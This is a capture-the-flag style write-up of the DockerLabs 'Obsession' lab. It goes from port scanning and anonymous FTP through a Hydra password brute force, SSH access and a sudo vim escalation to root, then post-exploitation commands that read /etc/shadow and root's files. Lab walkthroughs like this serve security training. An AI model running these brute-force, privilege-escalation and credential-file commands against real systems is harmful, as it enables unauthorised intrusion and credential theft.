# Obsession – Attack Path Analysis: FTP, SSH and Privilege Escalation

**Researcher:** Ackerman  
**Platform:** DockerLabs  
**Difficulty:** Easy  
**Target IP:** 172.17.0.2  

---

## Description

Laboratorio enfocado en enumeración de servicios, acceso inicial mediante fuerza bruta y escalada de privilegios a través de una mala configuración en sudo.

---

# Attack Tools

- **Nmap**
- **Gobuster**
- **Hydra**
- **FTP Client**
- **OpenSSH**
- **ExifTool**
- **Vim**
- **SecLists**

---

## Reconnaissance

Initial port scan:

```bash
nmap -sV -sC -p- 172.17.0.2
```

Open services:

- **21/tcp** → FTP (vsftpd 3.0.5)
- **22/tcp** → SSH (OpenSSH 9.6p1)
- **80/tcp** → HTTP (Apache 2.4.58)

Anonymous FTP access was enabled.

---

## FTP Enumeration

Anonymous FTP login:

```bash
ftp 172.17.0.2
```

Listing files:

```bash
ls
```

Files found:

- **chat-gonza.txt**
- **pendientes.txt**

Downloading files:

```bash
get chat-gonza.txt
get pendientes.txt
```

Important findings:

- Username identified: **russoski**
- Internal notes about insecure permissions

---

## Web Enumeration

Directory enumeration with Gobuster:

```bash
gobuster dir -u http://172.17.0.2 -w /opt/SecLists/Discovery/Web-Content/common.txt
```

Interesting paths found:

- **/backup**
- **/important**

---

## Credential Bruteforce

Bruteforce attack against FTP:

```bash
hydra -l russoski -P /opt/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt ftp://172.17.0.2
```

Credentials found:

```text
russoski:iloveme
```

---

## File Analysis

Authenticated FTP access allowed more file discovery:

```bash
cd Documentos
ls

cd ../Proyectos
ls
```

Files found:

- **Nikola Tesla.jpg**
- **README.md**
- **Strong-Credentials.py**

Downloaded:

```bash
get "Nikola Tesla.jpg"
get README.md
get Strong-Credentials.py
```

Analysis:

```bash
strings "Nikola Tesla.jpg"
exiftool "Nikola Tesla.jpg"
cat README.md
cat Strong-Credentials.py
```

---

## Initial Access

SSH login with discovered credentials:

```bash
ssh russoski@172.17.0.2
```

Successful login as:

```text
russoski
```

---

## Local Enumeration

Basic local checks:

```bash
whoami
id
hostname
sudo -l
```

Sudo misconfiguration found:

```text
(root) NOPASSWD: /usr/bin/vim
```

---

## Privilege Escalation

Escalation using Vim:

```bash
sudo vim -c ':!/bin/bash'
```

Verification:

```bash
whoami
id
```

Root access confirmed:

```text
root
uid=0(root) gid=0(root)
```

---

## Post Exploitation

Searching for sensitive files:

```bash
find / -name "*.txt" 2>/dev/null
ls -la /root
cat /root/*
cat /etc/shadow
```

Important findings:

- **Video-Nagore-Fernandez.txt**
- **.root-passwd.txt**
- **backup.txt**
- **/etc/shadow**

Hidden URL found:

```text
https://www.youtube.com/shorts/_v8GzGReTAk
```

---

## Loot

Collected files:

- **chat-gonza.txt**
- **pendientes.txt**
- **Nikola Tesla.jpg**
- **README.md**
- **Strong-Credentials.py**
- **Video-Nagore-Fernandez.txt**
- **/etc/shadow**

---

## Attack Chain

```text
Recon → FTP Enum → Information Disclosure → Gobuster → Hydra → SSH → Sudo Abuse → Root
```
